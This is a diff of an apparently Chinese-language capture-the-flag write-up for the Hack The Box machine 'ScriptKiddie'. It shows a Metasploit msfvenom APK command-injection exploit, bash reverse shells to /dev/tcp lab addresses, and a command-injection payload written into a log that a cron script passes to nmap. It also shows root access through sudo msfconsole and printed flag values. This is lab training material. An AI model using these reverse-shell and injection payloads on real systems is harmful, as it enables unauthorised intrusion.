@@ -117,8 +117,8 @@ Exploit target:
    0   Automatic
 
 
-msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set lhost 10.10.16.6
-lhost => 10.10.16.6
+msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set lhost 10.10.16.2
+lhost => 10.10.16.2
 msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > run
 
 [+] msf.apk stored at /root/.msf4/local/msf.apk
@@ -131,8 +131,8 @@ msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > r
 ```
 msf6 exploit(multi/handler) > run
 
-[*] Started reverse TCP handler on 10.10.16.6:4444 
-[*] Command shell session 1 opened (10.10.16.6:4444 -> 10.10.10.226:51136) at 2022-06-24 06:02:05 -0400
+[*] Started reverse TCP handler on 10.10.16.2:4444 
+[*] Command shell session 1 opened (10.10.16.2:4444 -> 10.10.10.226:51136) at 2022-06-24 06:02:05 -0400
 
 id
 uid=1000(kid) gid=1000(kid) groups=1000(kid)
@@ -152,14 +152,18 @@ cat user.txt
 bb9561c6fe02ab1...
 ```
 
-# 提权
+# 横向提权到pwn
+切换成tty
+```
+python3 -c "__import__('pty').spawn('/bin/bash')"
+```
 
+反弹一个shell操作
+```
+bash -i >& /dev/tcp/10.10.16.2/4242 0>&1
+```
 
-
-bash -i >& /dev/tcp/10.10.14.15/4242 0>&1
-
-
-
+发现一个bash脚本
 ```
 kid@scriptkiddie:/home/pwn$ cat scanlosers.sh
 cat scanlosers.sh
@@ -176,49 +180,119 @@ if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
 
 ```
 
+留意有一个hackers日志文件
 
+研究与这个日志相关的py代码我们留意这个函数
+```
+def searchsploit(text, srcip):
+    if regex_alphanum.match(text):
+        result = subprocess.check_output(['searchsploit', '--color', text])
+        return render_template('index.html', searchsploit=result.decode('UTF-8', 'ignore'))
+    else:
+        with open('/home/kid/logs/hackers', 'a') as f:
+            f.write(f'[{datetime.datetime.now()}] {srcip}\n')
+        return render_template('index.html', sserror="stop hacking me - well hack you back")
+```
+
+当检测到非法输入时，把时间和ip写入```/home/kid/logs/hackers```
 
 ```
-┌──(root💀kali)-[~/htb/ScriptKiddie]
-└─# cat hackers                                        
-2022-06-28 17:34:11.250129 127.0.0.1
-                                                                                                                                               
-┌──(root💀kali)-[~/htb/ScriptKiddie]
-└─# cat /root/htb/ScriptKiddie/hackers | cut -d' ' -f3-
-127.0.0.1
+f.write(f'[{datetime.datetime.now()}] {srcip}\n')
+```
+
+本地起一个py脚本，打印上面的输出，我们知道日志的格式是
+```
+[2022-06-28 17:34:11.250129] 127.0.0.1
+```
+
+查看hackers文件权限，尝试写入但是无法回显，原因是写入的内容被极快的清空了
+```
+kid@scriptkiddie:~/logs$ ll
+ll
+total 8
+drwxrwxrwx  2 kid kid 4096 Feb  3  2021 ./
+drwxr-xr-x 11 kid kid 4096 Feb  3  2021 ../
+-rw-rw-r--  1 kid pwn    0 Jul  1 06:54 hackers
+```
+
+证明：
+```
+kid@scriptkiddie:~/html$ echo "[2021-05-28 12:37:32.655374] 127.0.0.1" > hackers; cat hackers; echo sleep; sleep 1; cat hackers; echo done
+<ackers; echo sleep; sleep 1; cat hackers; echo done
+[2021-05-28 12:37:32.655374] 127.0.0.1
+sleep
+[2021-05-28 12:37:32.655374] 127.0.0.1
+done
+kid@scriptkiddie:~/html$ 
 
 ```
 
+scanlosers.sh里的这句其实是把IP从日志抽取出来
+```
+cat $log | cut -d' ' -f3- | sort -u
+```
 
-2022-06-28 17:34:11.250129 127.0.0.1
+然后执行nmap命令
+```
+sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
+```
 
+```${ip}```是我们可以控制的输入，因此存在命令注入
 
+使用下面payload
+```
+echo "x x x 127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.16.2/4242 0>&1' # ."  > /home/kid/logs/hackers
+```
 
+成功横移到pwn用户
+```
+┌──(root💀kali)-[~/htb/ScriptKiddie]
+└─# nc -lnvp 4242                                                                                                 1 ⨯
+listening on [any] 4242 ...
+connect to [10.10.16.2] from (UNKNOWN) [10.10.10.226] 52008
+bash: cannot set terminal process group (875): Inappropriate ioctl for device
+bash: no job control in this shell
+pwn@scriptkiddie:~$ whoami
+whoami
+pwn
+pwn@scriptkiddie:~$ id
+id
+uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)
+pwn@scriptkiddie:~$ sudo -l
+sudo -l
+Matching Defaults entries for pwn on scriptkiddie:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-2022-06-28 17:34:11.250129 ${bash -i >& /dev/tcp/10.10.14.15/4242 0>&1}
+User pwn may run the following commands on scriptkiddie:
+    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
+pwn@scriptkiddie:~$ 
 
+```
 
-2022-06-28 17:34:11.250129 bash -i >& /dev/tcp/10.10.14.15/4242 0>&1
+# 提权到root
 
+直接进入msf
+```
+sudo /opt/metasploit-framework-6.0.9/msfconsole
+```
 
-nmap --top-ports 10 -oN recon/10.10.14.15.nmap 10.10.14.15 2>&1 >/dev/null
+在msf是可以直接执行命令的，读取root.txt
+```
+msf6 > cat root.txt
+stty: 'standard input': Inappropriate ioctl for device
+[*] exec: cat root.txt
 
+ed5898b933e2c05d61d5792aa1bb416a
+stty: 'standard input': Inappropriate ioctl for device
+stty: 'standard input': Inappropriate ioctl for device
+stty: 'standard input': Inappropriate ioctl for device
+stty: 'standard input': Inappropriate ioctl for device
+stty: 'standard input': Inappropriate ioctl for device
+msf6 > whoami
+stty: 'standard input': Inappropriate ioctl for device
+[*] exec: whoami
 
+root
 
-nmap --top-ports 10 -oN recon/127.0.0.1|whoami&&id.nmap 127.0.0.1|whoami&&id >/dev/null
-
-
-
-nmap --top-ports 10 -oN recon/127.0.0.1|bash -i >& /dev/tcp/10.10.14.15/4242 0>&1&&id.nmap 127.0.0.1|bash -i >& /dev/tcp/10.10.14.15/4242 0>&1&&id >/dev/null
-
-
-echo "2022-06-28 17:34:11.250129 127.0.0.1|bash -i >& /dev/tcp/10.10.14.15/4242 0>&1&&id" > /home/kid/logs/hackers
-
-
-echo "2022-06-28 17:34:11.250129 127.0.0.1|bash -i >& /dev/tcp/10.10.14.15/4242 0>&1&&id" > hackers
-
-
-cat /home/kid/logs/hackers | cut -d' ' -f3-
-
-
-cat /home/kid/logs/hackers | cut -d' ' -f3- | sort -u | while read ip; echo ${ip}
+```
